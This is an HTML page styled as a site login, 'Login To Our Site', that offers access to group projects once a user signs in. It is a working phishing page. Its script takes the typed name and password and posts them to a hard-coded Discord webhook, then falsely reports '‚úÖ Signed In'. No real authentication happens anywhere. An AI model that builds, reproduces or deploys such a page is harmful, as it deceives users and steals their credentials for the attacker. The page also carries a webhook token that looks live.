<!DOCTYPE html>
<html>
<head>
  <title>Sign In...</title>
  <style>
    body {
      background: #111;
      color: white;
      font-family: Arial;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    input, textarea {
      width: 300px;
      padding: 10px;
      margin: 5px;
      border-radius: 5px;
      border: none;
      outline: none;
    }
    button {
      background: dodgerblue;
      color: white;
      border: none;
      border-radius: 5px;
      padding: 10px 20px;
      cursor: pointer;
    }
    button:hover {
      background: deepskyblue;
    }
  </style>
</head>
<body>
  <h2>Login To Our Site</h2>
  <p>Once you logged in, you can see our group projects and info!</p>
  <input id="username" type="text" placeholder="Your Email/Name">
  <textarea id="message" placeholder="Your Password"></textarea>
  <button onclick="sendToDiscord()">Next</button>

  <script>
    async function sendToDiscord() {
      const webhookURL = "https://discord.com/api/webhooks/1433314077861478452/iy89nNHXUzXaw68PZVjTOjvKY5i-x8aL7V1LWAWOSphwg9Q3eRH_Yuzjvxy520Pv9yD-"; // üîπ Replace this
      const username = document.getElementById("username").value || "Anonymous";
      const message = document.getElementById("message").value;

      if (!message) {
        alert("Error");
        return;
      }

      const payload = {
        username: username,
        content: message
      };

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        alert("‚úÖ Signed In");
      } catch (error) {
        alert("‚ùå Error Signing In");
        console.error(error);
      }
    }
  </script>
</body>
</html>
